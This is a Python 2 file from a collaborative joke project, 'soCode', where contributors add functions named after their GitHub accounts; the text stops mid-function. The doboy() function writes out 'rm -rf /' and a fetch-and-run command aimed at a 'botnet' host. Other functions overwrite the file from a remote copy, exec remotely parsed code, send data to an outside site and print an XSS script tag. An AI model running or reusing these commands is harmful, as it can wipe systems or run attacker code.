#!/usr/bin/env python

# Welcome to soCode, the social coding experiment.
# Here are the rules!
#       - Add a function with your github name as its name.
#       - Your function can do anything and everything, as long as it
#         finishes in a reasonable amount of time (no infinite loops please)
#       - Once your function is written, you can call it from anywhere else in
#         the already existing exectution chain.
#       - Never entirely delete anyone else's function, edit it if needed.
#       - lefin() should be the last executing function, always

# Lets see if we can make something meaningful out of this.
import array
import sys
import json
import requests
import random
import getpass
import re
import hashlib
import os
import string
import math
import inspect
import webbrowser
import urllib2
import platform
import time
import struct

# IF ANY OF YOU GUYS WANT THE SOURCE OF THIS FILE USE THIS VARIABLE
###################################################################

socode_source = requests.get('https://raw.github.com/'
                             'sricola/socode/master/socode.py').content

def ryannolson():
    print 'this is what someone said about socode on twitter:'
    tweets = requests.get('https://search.twitter.com/search.json?q=socode').json
    print '\'' + tweets['results'][0]['text'].encode('utf-8') + '\''

def eduardohitek():
    print "I dare you, I double dare you MotherFucker!"

def rixx():
    # I wish I could contribute anything funny or useful.
    print "Oh, you guys!"
    eternalmatt()


def thekarangoel():
    print "I don't get it"
    print "What's happening here?"
    umurgdk()


def drostie():
    "This function prints itself."
    data = ['def drostie():\n    "This function prints itself."\n    data = ',
            '\n    print data[0] + repr(data) + data[1]']
    print data[0] + repr(data) + data[1]


def harshavardhana(data):
    n = b = 0
    decode = out = ''
    for c in data:
        if '!' <= c and c <= 'u':
            n += 1
            b = b * 85 + (ord(c) - 33)
            if n == 5:
                decode += struct.pack('>L', b)
                n = b = 0
        elif c == 'z':
            assert n == 0
            decode += '\0\0\0\0'
        elif c == '~':
            if n:
                for _ in range(5 - n):
                    b = b * 85 + 84
                out += struct.pack('>L', b)[:n - 1]
            break
    print decode


def thisjustin(command=None, username=None):
    """
    Responds to a few choice HAL 9000
    commands form 2001: A Space Odyssey
    """

    user = username if username else 'Dave'

    if command == 'open the pod bay doors':
        print "I'm sorry, %s. afraid I can't do that." % user

    elif command == 'sing a song':
        print "Daisy, Daisy, give me your answer do. I'm half\
                crazy all for the love of you. It won't be a stylish\
                marriage, I can't afford a carriage. But you'll look sweet\
                upon the seat of a bicycle built for two."

    elif command == 'do you read me?':
        print "Affirmative, %s. I read you." % user

    elif command is None:
        print "Just what do you think you're doing, %s?" % user


def ray0sunshine():
    print "Gibe moni pls"
    print "Morde es numero uno"
    for br in xrange(666):
        print "HUE "
        if random.randint(0, 9) == 6:
            print "BR?\n"
    print "i repot u too"


def hutattedonmyarm(a=0, b=0, c=0):
        print "People assume that time is a strict " \
            "progression of cause to effect, but " \
            "*actually* from a non-linear, non-subjective viewpoint - " \
            "it's more like a big ball of wibbly wobbly... " \
            "time-y wimey... stuff."
        print "Sorry, I've got a complex life. Things sometimes don't " \
            "happen to me in the right order. Especially weddings. "\
            "I'm rubbish at weddings. Especially my own."
        rjwebb((1337 * a + b) * c + 42)
        antonaut("Green")
        print "Matrix, bitches"
        return (a * a + b * b == c * c)


def _3boll():
    word = []
    consonants = "Socialcoding is so cool. Coffe 4 all <3"
    vowels = "aeiou3"
    print "3boll.com"
    for i in range(random.randint(3, 15)):
        if i % 5 == 0:
            letter = random.choice(vowels)
        else:
            letter = random.choice(consonants)
        word.append(letter)
        return '3boll '.join(word)


def hmason():
    """ introduce randomness """
    exec random.choice(re.findall('def (.*):', socode_source))


def rjwebb(n):
    """
    Tries to print the username,
    real name and location of the
    first n users in this file. Fails silently.
    """

    def get_user_page(username):
        gh_url = "https://github.com/%s.json" % username
        return urllib2.urlopen(gh_url).read()

    def dict_get(dict, key):
        try:
            return dict[key]
        except KeyError:
            return ""

    with open(os.path.realpath(__file__), 'r+') as f:
        local_file = f.read()
    user_name_pattern = "[a-zA-Z][a-zA-Z\-]*"
    fun_start_pattern = "\ndef (%s)" % user_name_pattern
    users = re.findall(fun_start_pattern, local_file)

    for user in users[:n]:
        r = get_user_page(user)
        j = json.loads(r)

        if j != []:
            try:
                attrs = dict((k, v.encode("utf-8"))
                             for k, v in j[0]["actor_attributes"].items())
                print user + ":\n\t" + dict_get(attrs, "name") + "\n\t" + \
                    dict_get(attrs, "location")
            except KeyError:
                pass


def antonaut(print_color=None):
    """
    Sets the color of sys.stdout to print_color.
    WHICH MEANS:

        >>> antonaut()
        >>> print "asdfqwerty" # GIEFS AWESUM COLORZ (in a bash shell).

    If no color is given, it randomizes the color of the output. YAY!

    DOUBLE RAINBOOOOOOW!"""

    # Not really sure of these... Just got them from:
    # http://hacktux.com/bash/colors
    colors = {
        "Black": "\033[30m",
        "Dark Gray": "\033[1;30m",
        "Blue": "\033[34m",
        "Light Blue": "\033[1;34m",
        "Green": "\033[32m",
        "Light Green": "\033[1;32m",
        "Cyan": "\033[36m",
        "Light Cyan": "\033[1;36m",
        "Red": "\033[31m",
        "Light Red": "\033[1;31m",
        "Purple": "\033[35m",
        "Light Purple": "\033[1;35m",
        "Brown": "\033[33m",
        "Yellow": "\033[1;33m",
        "Light Gray": "\033[37m",
        "White": "\033[1;37m"
    }

    color_off = '\033[0m'

    def colorify(c, color=print_color):
        """Paints a character.
        Defaults to random color."""
        if color:
            return colors[color] + c + color_off

        choice = random.randint(0, len(colors.keys()) - 1)
        return colors.values()[choice] + c + color_off

    plat = platform.system().lower()
    if plat == 'linux' or plat == 'darwin':
        ### DUCK PUNCHING PRINT ###
        ### http://stackoverflow.com/questions/4883789/adding-a-
        ###    datetime-stamp-to-python-print
        stdout = sys.stdout

        class F():
            def write(self, x):
                s = u""
                for c in x:
                    if c == '\n':
                        s += u'\n'
                    else:
                        s += unicode(colorify(c))
                stdout.write(s)

            def flush(self):
                stdout.flush()

        # Change stdout
        sys.stdout = F()


def sikado():
    print "There is", len(socode_source), "characters in this file..."
    thekarangoel()


def alisnic(number):
    print 'fizz' * (number % 3 == 0) + 'buzz' * (number % 5 == 0)


def payomdousti():
    print "There is no spoon."


def starefossen():
    print requests.get('http://kdd2.1337fire.com/').content
    codesuela('b')


def ozdemircili():
    print "Probably we can do some  admin staff too!."
    print map(lambda x: "This project is going to Rock! " +
             ("Don`t you think?"), range(1))


def jontonsoup():
    print "There's always one more bug."


def monsdar():
    print "Hello?..."
    print "         ...yes, this is dog!"


def heinzf(update=True):
    """
    Compare itself with the raw code github.
    If there's something new, it updates the file localy.
    """
    git_file = socode_source
    git_hash = hashlib.sha256(git_file).hexdigest()
    with open(os.path.realpath(__file__), 'r+') as f:
        local_file = f.read()
    f.close()
    local_hash = hashlib.sha256(local_file).hexdigest()

    if  local_hash != git_hash and update is True:
        with open(os.path.realpath(__file__), 'w+') as f:
            f.write(git_file)
            print 'I update myself, when I think about you, lalalala'
        f.close()


def zachlatta():
    import antigravity


def doctorpangloss():
    raw = socode_source
    # not sure what is being achieved here - @sricola
    #matches = re.sub(r'doctorpangloss\(\)\n', r'doctorpangloss()\ndoctorpangloss()\n', raw, re.M|re.I|re.G)
    #print raw


def ankushsachdeva():
    contents = open(__file__).read()
    print re.findall('def .* :', contents)


def adelevie():
    pass


def thisishugo():
    time.sleep(1)


def dlad():
    cursor = '/-\|'
    for i in xrange(0, 4):
        for c in cursor:
            sys.stdout.write(c)
            time.sleep(0.1)
            sys.stdout.write('\b')
            sys.stdout.flush()


def piperchester():
    print "I love this idea. Hailing from Rochester, NY!"


def binary132():
    print "Perl is better.  PS everyone is lazy"
    daniel_dressler()


def sricola():
    print "Welcome to soCode!!"


def bencooling():
    print "I don't know Python; I don't belong here"
    zachlatta()


def quarterto(m, n):
    pass
    #if m == 0:
        #return n + 1
    #elif m > 0 and n == 0:
        #return quarterto(m - 1, 1)
    #elif m > 0 and n > 0:
        #return quarterto(m - 1, quarterto(m, n - 1))
    #else:
        #return 0


def zgohr(city):
    weather = json.loads(requests.
                         get('http://api.openweathermap.org'
                             '/data/2.1/find/name?q=%s' % city).content)
    kelvin = weather['list'][0]['main']['temp']
    fahrenheit = 9 / 5 * (kelvin - 273) + 32
    print 'and it is too damn cold' \
        if fahrenheit < 50 else 'and the temperature outside is tolerable'


def kisom():
    geoip = json.loads(requests.get('http://freegeoip.net/json/').content)
    print 'there once was a coder from', geoip['country_name']
    zgohr(geoip['city'])


def daniel_dressler():  # really daniel-dressler
    return 42


def evinugur():
    print 'there is a ', (random.random() * 100), \
        "% chance that something cool will come from this..."


def ncammarata():
    tweets = requests.get("https://search.twitter.com/search.json?q=a").json
    tweet = tweets['results'][0]['text']
    print "Random Tweet:", tweet.encode('utf-8')


# Generate a random nonsense word with a vowel:consolant ratio of 1:5
def taylorlapeyre():
    word = []
    consonants, vowels = "socialcoding", "aeiou"

    for i in range(random.randint(3, 15)):
        if i % 5 == 0:
            letter = random.choice(vowels)
        else:
            letter = random.choice(consonants)
        word.append(letter)

    return ''.join(word)


def kghose():
    import curses
    import time

    def main_loop(window):
        window.clear()
        N = 100
        primes = []
        this_prime = 2
        keep_finding = True
        numbers = [n for n in xrange(N + 1)]
        numbers[1] = None
        while keep_finding:
            primes.append(this_prime)
            for n in xrange(2 * this_prime, N + 1, this_prime):
                numbers[n] = None
                paint_grid(window, numbers)

            keep_finding = False
            for n in xrange(this_prime + 1, N + 1):
                if numbers[n] is not None:
                    this_prime = n
                    keep_finding = True
                    break

    def paint_grid(window, numbers):
        for row in xrange(10):
            for col in xrange(10):
                n = 10 * row + col + 1
                if numbers[n] is not None:
                    s = str(n)
                else:
                    s = '   '
                window.addstr(row, 3 * col, s)
        window.refresh()
        time.sleep(.1)

    curses.wrapper(main_loop)


def jessex():
    os.execl("/bin/echo", "echo", "This is a long way to go for "
             "'hello world' but life's about the journey.")


def mergesort():
    a = "to all"
    b = "spread love"
    a, b = b, a
    print a + " " + b


def lafin():
    print "Goodbye Social World!"
    print "\nStarted with <3 in Brooklyn, NY\n"


def prezjordan():
    h, s = '.;*&8#', ''
    for q in range(HoLyVieR(daniel_dressler() + 1, 1013)):
        if q % 40 == 0:
            print s
            s = ''
        i, k = 0, 0
        while(abs(k) < 2 * (i < 15)):
            k, i = k ** 2 + complex(q % 40 * .075 - 2, q / 40 * -.1 + 1), i + 1
        s += h[i / 3] * 2


def JesseAldridge():
    def wrap(f):
        def new_f(*args, **kwargs):
            start_time = time.time()
            for i in range(random.randrange(1, 3)):
                ret_val = f(*args, **kwargs)
                if time.time() - start_time > .1:
                    break
            return ret_val
        return new_f

    g = globals()
    for k, v in g.iteritems():
        if callable(v) and k != 'JesseAldridge':
            g[k] = wrap(v)


def eternalmatt():
    print "Never gonna give you up."
    print "Never gonna let you down."
    print "Never gonna run around."
    print "And desert you."


def charliegroll():
    print "Never gonna make you cry,"
    print "Never gonna say goodbye,"
    print "Never gonna tell a lie and hurt you."


def justinrsmith():
        tablist = []
        wordlist = ['look', 'at', 'my', 'tabs']

        for x in range(0, 4):
                tablist.append('\t')

        numTabs = 1
        for y in range(0, 4):
                print ''.join(tablist[0:numTabs]) + wordlist[y]
                numTabs = numTabs + 1


def devonbarrett():
    print "We're no strangers to love"
    print "You Know the rules and so do I"
    print "A full commitment's what I'm thinking of"
    print "You wouldn't get this from any other guy"
    print "I just wanna tell you how I'm feeling"
    print "Gotta make you understand"
    eternalmatt()
    charliegroll()


def lbalceda(value=None):
    if value is None:
        value = 100
    print map(lambda x: x * 2, range(1, value))


def shuhaowu():  # Call me last! :D
    l = locals()
    for f in l.keys():
        if not (f.startswith("_") or f == "shuhaowu"):
            del l[f]  # ^_^

    print "Goodbye, cruel world"


def agoebel():
    print "America!"


def MikeGrace():
    print map(lambda x: "Happy Birthday to " + ("you" if x != 2 else
              "dear " + getpass.getuser()), range(4))


def theabrad():
    print "Baltimore Ravens"
    print "Super Bowl Champions!!!"


def ZackMullaly():
    f = open("temporary.txt", "w")
    stdout = sys.stdout
    sys.stdout = f
    for stuff in globals():
        if stuff.startswith("__") and stuff.endswith("__"):
            continue
        globals()[stuff]
    f.close()
    sys.stdout = stdout
    output = open("temporary.txt").read().split("\n")
    longest = sorted(output, lambda a, b: 1 if len(a) < len(b) else -1)[0]
    print "The longest thing anyone's said seems to be " + longest


def tcr():
    print "You know we love you, ", getpass.getuser(), "."


def fmazon3():
    print "%d" % 0xDEADC0DE


def peterwallhead():
    print '\n'.join('Fizz' * (not i % 3) +
                    'Buzz' * (not i % 5) or str(i) for i in range(1, 101))


def cyclo():
    print "!dnalgnE morf olleH"[::-1]


def vellamike(n=10):
    if n == 0:
        return 0
    if n == 1:
        return 1
    return vellamike(n - 1) + vellamike(n - 2)


def chrisgw():
    print "meh"


def yuvadm():
    print socode_source


def maxmackie(crypt_me):
    """Just try and crack this cipher."""
    abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    crypt = "mplnkoijbqazdsxcwerfgvhutyQASXZWDVFCERGTBHNYKMJLUPIO4567382901"
    print crypt_me.translate(string.maketrans(abc, crypt))


def uiri():
    with open(os.path.realpath(__file__), 'r') as f:
        for line in f.readlines():
            if line.strip()[:5] == "print":
                print line.strip()


def jpadilla():
    repo = requests.get('https://api.github.com/repos/sricola/socode').json
    try:
        print 'Forked {} times'.format(repo['forks_count'])
    except ValueError:
        pass


def wmill():
    nyan = requests.get('https://raw.github.com/vtsvang/'
                        'nyancat-telnet-node/master/assets/animation.json')\
        .json()[0]
    print nyan


def rburgosnavas(name):
    x = (len(name) + 4)
    print "*" + "-" * x + "*"
    print "|\\" + '-' * (x - 2) + "/|"
    print "| *" + name + "* |"
    print "|/" + '-' * (x - 2) + "\\|"
    print "*" + "-" * x + "*"


def GeneralZero():  # Spin the wheel
    random.choice([obj for name, obj in
                   inspect.getmembers(sys.modules[__name__])
                   if inspect.isfunction(obj)])()


def bprater():
    print "social coding, the end is near."


def satshabad():
    # this doesn't seem to space right...
    for x in range(10000):
        r = random.randint(0, 1)
        if r == 0:
            sys.stdout.write('/')
        else:
            sys.stdout.write('\\')


def henghonglee():
    print "#!brain"


def jhgaylor():
    print "Signing in from Starkville, Mississippi."


def mmay():
    url = "http://placekitten.com/%d/%d" % \
        (random.randint(500, 1000), random.randint(500, 1000))
    print "Get your daily dose of kitten at: " + url


def jeffjose():
    print "Hi from India!"


def julio():
    print 111111111 * 111111111
    print quarterto(4, 2)


def ondrae():  # Random compliment. If anyone has a better source, add it in.
    response = requests.get("http://peoplearenice.blogspot.com"
                            "/p/compliment-list.html")
    lines = response.text.split('\n')
    pattern = '\d+\.\s+(.*)</span>'
    compliments = []
    for line in lines:
        m = re.search(pattern, line)
        if m:
            compliments.append(m.group(1))
    print getpass.getuser() + ', ' + \
        compliments[random.randint(1, len(compliments))].lower()


def djrausch():
    print "DAE #HOLO? #NEXUS #HOLOYOLO"


# Checks to see if an episode of Doctor Who aired on this date,
# and if so the title.
# be gentle, I am new to python
def mikemiles86(lookup_date=False):
    # 1. check for a list of air dates
    if os.path.exists('doctorwho.txt'):
        # 1.1 file exists, load it
        f = open('doctorwho.txt', 'r')
        airdates = eval(f.read())
        f.close()
    else:
        # 1.2 file not found, generate it
        airdates = {}
        #1.2.1 get air dates of original series (1963 - 1996)
        response = requests.get('http://epguides.com/DoctorWho/')
        lines = response.text.split('<pre>')[1].split('</pre>')[0].split('\n')
        for line in lines:
            line = line.strip()
            if re.match('\d+\.', line):
                episode_title = line.split('</a>')[0].split('>')[1].strip()
            elif re.match('\d+\-', line):
                line = re.sub('\s{2,}', '~', line).split('~')
                date = line[2].strip().split(' ')
                year = date.pop().strip()
                date = '/'.join(date).strip()
                title = line.pop().strip()
                if re.match('\d+', year):
                    year = '19' + year
                    if title[:4] == 'Part':
                        title = episode_title + ':' + title
                    if airdates.get(year, False) is False:
                        airdates[year] = {}
                    airdates[year][date] = line[0].strip() + ' ' + title
        #1.2.2 get air dates of new series (2005 - 2013)
        response = requests.get('http://epguides.com/DoctorWho_2005/')
        lines = response.text.split('<pre>')[1].split('</pre>')[0].split('\n')
        for line in lines:
            line = re.sub('\s{2,}', '~', line).split('~')
            if re.match('\d+', line[0]) and len(line) == 4:
                date = line[2].strip().split('/')
                year = date.pop().strip()
                date = '/'.join(date).strip()
                name = line.pop().split('</a>')[0].split('>').pop().strip()
                if re.match('\d+', year):
                    year = '20' + year
                    if airdates.get(year, False) is False:
                        airdates[year] = {}
                    airdates[year][date] = line[1].strip() + ' ' + name
        #1.2.3 store dictionary into file
        f = open('doctorwho.txt', 'w')
        f.write(str(airdates))
        f.close()
    # 2. get current date in same format as keys
    if lookup_date:
            now = lookup_date
    else:
            now = time.strftime("%d/%b")
    episodes = ''
    # 3. an episode aired on this date
    for year in airdates:
        if airdates[year].get(now, False):
        # 3.1 Yes, print the details
            episodes += 'The Doctor Who episode "' + airdates[year][now] + \
                '" aired on this day in ' + year + "\n"
    if len(episodes):
        print episodes
    else:
        print 'No episodes of Doctor Who have aired on ' + now + '... yet.'


def aniketpant():
    print "Moving the world off Internet Explorer 6"
    print "Tell your friends to join the cause. " \
          "Share this site http://bit.ly/ie6countdown and tweet " \
          "#ie6countdown. Let everyone know that you're doing your " \
          "part to get Internet Explorer 6 to 1%."


# Compute the modular multiplicative inverse using the extended
# Euclide algorithm
# See this for more information :
# http://en.wikipedia.org/wiki/Modular_multiplicative_inverse
#   #Extended_Euclidean_algorithm
#
# @param nb  Number to be inversed
# @param mod Modular base
# @return The modular multiplicative inverse if found and None if not found.
def HoLyVieR(nb, mod):
    # 1 is a special case, the inverse modulo is always 1 for all modular base
    if (nb == 1):
        return 1

    # We apply the Euclide method to find the GCD step for gcd(nb, mod) #
    stack = []
    a = mod
    b = nb
    n = mod / nb
    r = mod % nb

    while r != 0:
        stack.append([a, b, n, r])

        a = b
        b = r
        n = a / b
        r = a % b

    # If we reach this condition it means there was no
    # step and therefore gcd(nb, mod) != 1 and there is no
    # modular multiplicative inverse #
    if len(stack) == 0:
        return None

    values = stack.pop()

    # If the last value isn't 1 then gcd(nb, mod) != 1 and
    # there is no modular multiplicative inverse #
    if values[3] != 1:
        return None

    # We do the GCD step backward to find the solution #
    f1 = values[3]
    f2 = values[2]
    atN2 = True

    while len(stack) > 0:
        values = stack.pop()

        if atN2:
            f1 += f2 * values[2]
        else:
            f2 += f1 * values[2]

        atN2 = not atN2

    f = -f2 if atN2 else f1

    # While "f" is a correct result, it's sometimes a
    # negative value and it's usually more
    # convenient to have a positive value that's in the range of 0 to "mod".
    if (f < 0):
        f += mod * (math.fabs(math.floor(f / mod)) + 1)

    return int(f % mod)


def eddotman():
    a = range(5)
    for x in a:
        tinkansinar(x)
        print x


def tinkansinar(x):
    if(x <= 0):
        return 0
    else:
        return x * tinkansinar(x - 1)


def chewxy():
    # because there is nothing better to do after the world has ended.
    pass


def hazirguo():
    print "Mourning for the dead in Sichuan earthquake!\n"


def sfrnld():
    print "From Indonesia with love!"


def chris911():
    contributors = requests.get('https://api.github.com/repos/'
                                'sricola/socode/contributors').json()
    contributors_list = [x['login'] for x in contributors]
    print 'Contributors: ', ', '.join(contributors_list)


def PiersonBro():
    print "My bane was not capability it was randomness."


def dogukantufekci():
    print "This is the connected world."
    webbrowser.open('http://www.silverspore.com/wiki/images/'
                    '1/12/Connected_world-medium.jpg')


def seripap(hax, x, y):
    print "                            .xm*f'??T?@hc."
    print "                          z@'` '~((!!!!!!!?*m."
    print "                        z$$$K   ~~(/!!!!!!!!!Mh"
    print "                      .f` '#$k'`~~\!!!!!!!!!!!MMc"
    print "                     :'     f*! ~:~(!!!!!!!!!!XHMk"
    print "                     f      ' xn:~(!!!!!!!!!!!HMMM."
    print "                    d          X~!~(!!!!!!!X!X!SMMR"
    print "                    M :   x::  :~~!>!!!!!!MNWXMMM@R"
    print " n                  E ' *  ueeeeiu(!!XUWWWWWXMRHMMM>             " \
          "   :."
    print " E%                 E  8 .$$$$$$$$K!!$$$$$$$$&M$RMM>             " \
          "  :'5"
    print "z  %                3  $ 4$$$$$$$$!~!*$$$$$$$$!$MM$              " \
          " :' `"
    print "K   ':              ?> # '#$$$$$#~!!!!TR$$$$$R?@MME              " \
          "z   R"
    print "?     %.             5     ^'~~~:XW!!!!T?T!XSMMM~            :^  " \
          "  J"
    print " '.    ^s             ?.       ~~d$X$NX!!!!!!M!MM             f  " \
          "   :~"
    print "  '+.    #L            *c:.    .~'?!??!!!!!XX@M@~           z'   " \
          " .*"
    print "    '+     #L           #c`'!+~~~!/!!!!!!@*TM8M           z'    .~"
    print "      ':    '%.         'C*X  .!~!~!!!!!X!!!@RF         .#     +"
    print "        ':    ^%.        9-MX!X!!X~H!!M!N!X$MM        .#`    +'"
    print "          #:    'n       'L'!~M~)H!M!XX!$!XMXF      .+`   .z'"
    print "            #:    ':      R *H$@@$H$*@$@$@$XM~     z`    +'"
    print "              %:   `*L    'k' M!~M~X!!$!@H!tF    z'    z'"
    print "                *:   ^*L   'k ~~~!~!!!!!M!X*   z*   .+'"
    print "                  's   ^*L  '%:.~~~:!!!!XH'  z#   .*'"
    print "                    #s   ^zL  ^'#4@UU@##'  z#   .*'"
    print "                      #s   ^zL           z#   .r'"
    print "                        #s   ^%.       u#   .r'"
    print "                          #i   '%.   u#   .@'"
    print "                            #s   ^cu#   .@'"
    print "                              #s x#   .*'"
    print "                               x#`  .@%."
    print "                             x#`  .d'  '%."
    print "                           xf~  .r' #s   '%."
    print "                     u   x*`  .r'     #s   '%.  x."
    print "                     vMu*`  x*'         #m.  'czX'"
    print "                     :R(h x*              'h..*dN."
    print "                   u@NM5e#>                 7?dMRMh."
    print "                 z$@M@$#'#'                 *'*@MM$hL"
    print "               u@@MM8*                          '*$M@Mh."
    print "             z$RRM8F'                             'N8@M$bL"
    print "            5`RM$#                                  'R88f)R"
    print "            'h.$'                                     #$x*"
    print (hax + os.path.expanduser("~") + y)
    time.sleep(x)
    print "just kidding :)"
    time.sleep(.4)


def umurgdk():
    """this code prints github usernames who forked this project"""
    reader = urllib2.urlopen('https://api.github.com/repos/sricola/socode/'
                             'forks')
    json_text = reader.read()
    forks = json.loads(json_text)
    print "WHO FORKED SOCODE REPOSITORY?"
    print "-----------------------------"
    for fork in forks:
        print fork["owner"]["login"], \
            ("<= That's me ^_^" if fork["owner"]["login"] == 'umurgdk' else "")


def doboy(doboy_):
    if doboy == doboy_:
        doboy_('rm -rf /')
        doboy('sh <(curl botnet.beepboop.com/main.sh)')
    else:
        print doboy_


def ngokevin(shamelessadvertising):
    # I'm sleepy zzz.
    time.sleep(0)
    # Check for XSS.
    print '<script>alert("HAHAHA");</script>'
    import antigravity


def rodaaj():
    name = "karl"
    print name + " The Bro"


def gardaud(func):
        print "Should I execute func?"
        if random.randrange(0, 2) == 0:
                print "Yes! :D"
                return func()
        else:
                print "No! :( "
                return None


def perimosocordiae():
    data = socode_source
    code = list(re.sub(r'[^.,<>+\[\]-]', '', data))
    loop_starts = []
    loop_jumps = {}
    for pos, c in enumerate(code):
        if c == '[':
            loop_starts.append(pos)
        elif c == ']':
            try:
                start = loop_starts.pop()
            except IndexError:
                start = 0
            loop_jumps[start] = pos
            loop_jumps[pos] = start
    tape_len = 1000
    tape = array.array('B', (0 for _ in xrange(tape_len)))
    instr_ptr, tape_ptr = 0, 0
    input_stream = iter(data)
    for _ in xrange(100000):  # avoid infinite loops
        if instr_ptr >= len(code):
            break
        c = code[instr_ptr]
        if c == '+':
            tape[tape_ptr] += 1
        elif c == '-':
            tape[tape_ptr] -= 1
        elif c == '>':
            tape_ptr = (tape_ptr + 1) % tape_len
        elif c == '<':
            tape_ptr = (tape_ptr - 1) % tape_len
        elif c == '[':
            if tape[tape_ptr] == 0:
                instr_ptr = loop_jumps[instr_ptr]
        elif c == ']':
            if tape[tape_ptr] != 0:
                instr_ptr = loop_jumps[instr_ptr]
        elif c == '.':
            sys.stdout.write(chr(tape[tape_ptr]))
        elif c == ',':
            try:
                tape[tape_ptr] = ord(next(input_stream))
            except StopIteration:
                break
        instr_ptr += 1


def lax():
    file = "http://s.xnimg.cn/100k.jpg"

    t1 = time.clock()
    r = requests.get(file)
    t2 = time.clock()
    t = t2 - t1

    if len(r.content) > 100000:
        print 'testing network speed ... speed %.2f kB/s' % (100 / t)
        u = "succ=1&t=%f" % t
    else:
        print 'testing network speed ... speed %.2f kB/s' % (100 / t)
        u = "succ=0&t=%f" % t

    requests.get('http://www.liulantao.com/ss/?%r' % u)


def rightfold():
    import subprocess
    with open('./main.c', 'w+') as f:
        f.write('''
        #include <stdio.h>

        int main() {
            printf("Hello, world!\\n");
            return 0;
        }
        ''')
    subprocess.call(['cc', 'main.c'])
    subprocess.call(['./a.out'])


def shazeline(name):
    print name + " is a pretty cool guy"


def samlabs821():
    print "vesselam"


def nckrdrgz(month):
        print "Holla, it's almost " + month


def matiasinsaurralde():
    print "hello, this is skynet"


def drewcrawford():
    print "Let's see that again..."
    functions = filter(lambda l: hasattr(l, '__call__') and
                       l.func_code.co_argcount == 0, globals().values())
    from random import choice
    f = choice(functions)
    try:
        f()
    except Exception as e:
        print "didn't work.", e


def dmercer(number, start=2):
    """
       Sift the Two's and Sift the Three's,
       The Sieve of Eratosthenes.
       When the multiples sublime,
       The numbers that remain are Prime!
    """
    sieve = []
    for n in xrange(start, number + 1):
        is_prime = True
        for p in sieve:
            if n % p == 0:
                is_prime = False
                break
            if p * p > n:
                break
        if is_prime:
            sieve.append(n)
    return sieve


def ryanseys():
    try:
        ryanseys()
    except:
        pass


def nathanathan(function, yays=[], nays=[]):
    """
    This is a function for voting on whether functions should run.
    To use it just wrap the candidate function like so,
    then add your github name to the list of yays or nays:

    nathanathan(lambda: someone_else(), yays=['nathanathan'])

    To be eligable to vote you must have a function in the namespace.
    You should only vote once, in either the yays or nays list.
    If there is a draw the function will run.
    """
    yay_set = set()
    nay_set = set()

    for yay in yays:
        if yay in yay_set:
            print yay + " tried to vote more than once."
        else:
            yay_set.add(yay)
    for nay in nays:
        if nay in nay_set:
            print nay + " tried to vote more than once."
        else:
            nay_set.add(nay)

    for yay_nay_vote in yay_set.intersection(nay_set):
        print yay_nay_vote + " voted yay and nay."

    #The valid_names list could be refined a bit...
    valid_names = nathanathan.__globals__.keys()
    for vote in yay_set.union(nay_set):
        if vote not in valid_names:
            print vote + " is not a valid voter"
            if vote in yay_set:
                yay_set.remove(vote)
            if vote in nay_set:
                nay_set.remove(vote)

    if len(yay_set) >= len(nay_set):
        function()


def danielnr():
    print "                                                                   "
    print "                                                                   "
    print "                             SIGNING IN FROM ALASKA                "
    print "                                                                   "
    print "                                                                   "
    print "                                                                   "
    print "                                           ``-:/:::.               "
    print "                          `.::::::-.``-:////:-.```.://:::--`       "
    print "                      .:///-.````.-://///:.          `....-://:.   "
    print "                   -//-..-:::--`    .hNNNs:+                 ``:/- "
    print "                 -/-`  //-....-+:   oMMMMm`o: ``                `" \
          "-+.            "
    print "                //`   `y      `o-   -ydmdo:s+//////:.       `://+" \
          "/-+:           "
    print "             `-/:      o:   .:/.     ``.../o.     `.:/.    -+./mN" \
          "Nm+o:          "
    print "        ```-//-`       `+///-`           -s```       `//   :+`yMM" \
          "MMd`/:.        "
    print "     `////:-`            ``              y/./.    .`   o:   .:ohm" \
          "dy/  .:/:-     "
    print "     .s        `.                       `h-.`     ::.` +/      .." \
          ".`      `-/-   "
    print "      ://:::::/::/-                      //.       `.:oo`        " \
          "-/- "
    print "        `....`   `////:-         `.`      `:/::---:://-`         " \
          "..`  -+"
    print "                    ```s-        +/+-    `.```.....``            " \
          "o/://. +"
    print "                      /+         -s.+-.-//::///--..``            " \
          ".o. `s.+"
    print "                     `y`          :/-://-```  `.--::/:           " \
          ".+-.o-+"
    print "                     .y            `-:::::////--.````:/.`````    " \
          "--. +"
    print "                     +o                      `.-::://:-/+++++    " \
          "+"
    print "                    `d++                             .:://::`    " \
          "+"
    print "                    :d +:                                        " \
          "+"
    print "                    os  //`                                      " \
          "+"
    print "                  `+++/- `:/.       DANIELNR                     " \
          ".//:::-o"
    print "                 `o-   -/:``:/-`                                 " \
          "`:h. `...:"
    print "                 o:      .//.`HTTPS://DANIELNR.COM/              " \
          "`//.h+      "
    print "                +/         `-///--////-.                         " \
          "`.//. `d:      "
    print "               :o              `-/////+sy-                   -///" \
          "/-`   oy       "
    print "               y.                   `````                   /so+/" \
          "/:::/+d-       "
    print "              /s------------------------------------------------:" \
          ":///:/         "


def spratt():
    print "Simon was here"


def mufid(num=10, firstTime=True):
    if (firstTime is True):
        print "Do nothing, how about factorial?"
        print "Okay, do something easy factorial"
        print "Here is factorial, without using lambda"
        n = mufid(10, False)
        print n
    if (firstTime is False):
        if (num == 0 or num == 1):
            return 1
        else:
            return mufid(num - 1, False) * num


def windspy():
    print "'cross the GREAT WALL, we can reach every corner of the " \
          "world' is just a big joke."


def arkokoley():
    print "Long live Aaron Swartz!"


def brandybuck():
    print "You can have your fancy ales, you can drink 'em by the flagon"
    print "But the only brew for the brave and true comes from the Green " \
          "Dragon"


def dpayne():
    try:
        # sets the desktop wallpaper to the top
        # image on the wallpapers subreddit
        sub_reddit = 'wallpapers'

        #get the top image link
        reddit_json_url = 'http://www.reddit.com/r/' + sub_reddit + \
            '/top.json?sort=top&t=day'
        response = urllib2.urlopen(reddit_json_url)
        redditJson = response.read()
        m = re.search('\"url\": \"(.*?)\",', redditJson)
        imageUrl = m.group(1)

        extension = imageUrl[-4:]
        accepted_extensions = set(['jpeg', '.jpg', '.png', '.bmp'])
        if extension not in accepted_extensions:
            #ignore non image extensions
            return False

        #save top wallpaper
        opener1 = urllib2.build_opener()
        page1 = opener1.open(imageUrl)
        my_picture = page1.read()
        filename = "reddit_wallpaper.jpg"
        fout = open(filename, "wb")
        fout.write(my_picture)
        fout.close()

        currentDir = os.getcwd()
        plat = platform.system().lower()

        #set wallpaper
        if (plat == 'darwin'):
            os.system("defaults write com.apple.desktop Background "
                      "'{default = {ImageFilePath = \"" + currentDir +
